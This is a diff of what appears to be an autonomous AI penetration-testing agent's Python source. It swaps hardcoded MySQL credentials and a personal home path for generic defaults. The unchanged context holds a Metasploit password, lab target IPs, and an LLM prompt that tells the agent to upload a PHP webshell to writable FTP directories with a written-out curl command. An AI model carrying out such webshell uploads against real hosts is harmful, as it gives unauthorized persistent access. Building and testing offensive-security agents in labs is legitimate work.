@@ -80,9 +80,9 @@ TARGET_IP      = os.environ.get("TARGET_IP",       "192.168.234.130").strip()
 LOCAL_IP       = os.environ.get("LOCAL_IP",        "192.168.234.128").strip()
 MSF_PASSWORD   = os.environ.get("MSF_PASSWORD",    "password").strip()
 MSF_PORT       = int(os.environ.get("MSF_PORT",    "55553"))
-MYSQL_HOST     = os.environ.get("MYSQL_HOST",      "192.168.19.1").strip()
-MYSQL_USER     = os.environ.get("MYSQL_USER",      "Will").strip()
-MYSQL_PASSWORD = os.environ.get("MYSQL_PASSWORD",  "toor").strip()
+MYSQL_HOST     = os.environ.get("MYSQL_HOST",      "127.0.0.1").strip()
+MYSQL_USER     = os.environ.get("MYSQL_USER",      "root").strip()
+MYSQL_PASSWORD = os.environ.get("MYSQL_PASSWORD",  "").strip()
 MYSQL_DATABASE = os.environ.get("MYSQL_DATABASE",  "art_agent").strip()
 
 # ── Per-host log file routing ──────────────────────────────────────────────
@@ -651,7 +651,7 @@ executable_action_prompt = PromptTemplate(
         "For network services (FTP/SSH/SMB/IRC/PostgreSQL) prefer Metasploit modules. "
         "EXCEPTION: if a Metasploit FTP exploit fails or is unavailable, and FTP allows anonymous or "
         "credentialed login to a writable directory that is also served by HTTP, upload a PHP webshell. "
-        "Step 1 — upload: `curl -T /home/will/apt-agent_single_host/data/webshell.php "
+        "Step 1 — upload: `curl -T data/webshell.php "
         "ftp://{IP}/<path>/webshell.php --user <user>:<pass>` where <path> is the writable FTP path "
         "you discovered (if FTP root is writable use `ftp://{IP}/webshell.php`; if a subdirectory like "
         "`/upload` is writable use `ftp://{IP}/upload/webshell.php`). Use `anonymous:anonymous` for "
